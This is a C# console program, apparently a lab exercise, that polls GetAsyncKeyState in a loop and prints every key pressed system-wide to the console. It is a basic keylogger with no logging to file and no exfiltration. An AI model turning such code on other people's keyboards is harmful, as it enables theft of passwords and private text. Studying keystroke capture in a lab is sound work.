using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Lab._04_1
{
    class Program
    {
        [DllImport("User32.dll")] public static extern int GetAsyncKeyState(int x);
        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(50);
                for (int i=0 ; i < 255; i++)
                {
                    int Key = GetAsyncKeyState(i);
                    if (Key != 0)
                    {
                        switch (i)
                        {
                            case 8:
                                Console.Write("BackSpace");
                                break;
                            case 9:
                                Console.Write("Tab");
                                break;
                            case 13:
                                Console.Write("Enter");
                                break;
                            case 16:
                                Console.Write("Shift");
                                break;
                            case 20:
                                Console.Write("CapsLock");
                                break;
                            case 27:
                                Console.Write("Escape");
                                break;
                            case 35:
                                Console.Write("End");
                                break;
                            case 36:
                                Console.Write("Home");
                                break;
                            default:
                                Console.Write((char)i);
                                break;
                        }                        
                    }
                }
            }
        }
    }
}
